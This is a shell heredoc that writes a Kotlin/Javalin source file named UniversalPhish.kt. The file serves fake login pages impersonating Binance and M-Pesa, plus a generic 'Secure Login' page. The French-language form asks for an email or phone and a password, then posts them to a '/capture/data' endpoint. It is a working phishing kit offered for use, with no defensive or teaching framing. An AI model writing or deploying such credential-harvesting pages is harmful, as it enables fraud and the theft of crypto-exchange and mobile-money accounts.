cat << 'EOF' > src/main/kotlin/com/fardc/sigint/core/UniversalPhish.kt
package com.fardc.sigint.core
import io.javalin.Javalin

class UniversalPhish(private val vault: SecurityVault) {
    fun setup(app: Javalin) {
        app.get("/login/{target}") { ctx ->
            val target = ctx.pathParam("target").lowercase()
            
            // Configuration Visuelle Haute Fidélité
            val ui = when(target) {
                "binance" -> Triple("Binance", "#181a20", "#fcd535")
                "mpesa"   -> Triple("M-Pesa", "#e11d23", "#ffffff")
                else      -> Triple("Secure Login", "#121212", "#00ff00")
            }

            ctx.html("""
                <!DOCTYPE html>
                <html lang="fr">
                <head>
                    <meta charset="UTF-8">
                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
                    <style>
                        body { background-color: ${ui.second}; color: white; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
                        .card { background: #1e2329; width: 90%; max-width: 380px; padding: 32px; border-radius: 16px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
                        h2 { font-size: 24px; font-weight: 600; margin-bottom: 8px; text-align: left; }
                        p { color: #848e9c; font-size: 14px; margin-bottom: 24px; text-align: left; }
                        .input-group { margin-bottom: 16px; text-align: left; }
                        label { display: block; margin-bottom: 8px; font-size: 14px; color: #eaecef; }
                        input { width: 100%; padding: 12px; border: 1px solid #474d57; background: transparent; border-radius: 4px; color: white; font-size: 16px; box-sizing: border-box; }
                        input:focus { border-color: ${ui.third}; outline: none; }
                        button { width: 100%; padding: 14px; background-color: ${ui.third}; color: black; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 10px; transition: opacity 0.2s; }
                        button:active { opacity: 0.8; }
                        .footer { margin-top: 24px; font-size: 12px; color: #474d57; text-align: center; }
                    </style>
                </head>
                <body>
                    <div class="card">
                        <h2>Connexion ${ui.first}</h2>
                        <p>Entrez vos identifiants pour sécuriser votre compte.</p>
                        <form action="/capture/data" method="POST">
                            <input type="hidden" name="provider" value="${ui.first}">
                            <div class="input-group">
                                <label>Email / Téléphone</label>
                                <input type="text" name="id" required placeholder="Saisissez votre identifiant">
                            </div>
                            <div class="input-group">
                                <label>Mot de passe</label>
                                <input type="password" name="pin" required placeholder="••••••••">
                            </div>
                            <button type="submit">Se connecter</button>
                        </form>
                        <div class="footer">© 2025 ${ui.first} Global. Tous droits réservés.</div>
                    </div>
                </body>
                </html>
            """.trimIndent())
        }
    }
}
EOF
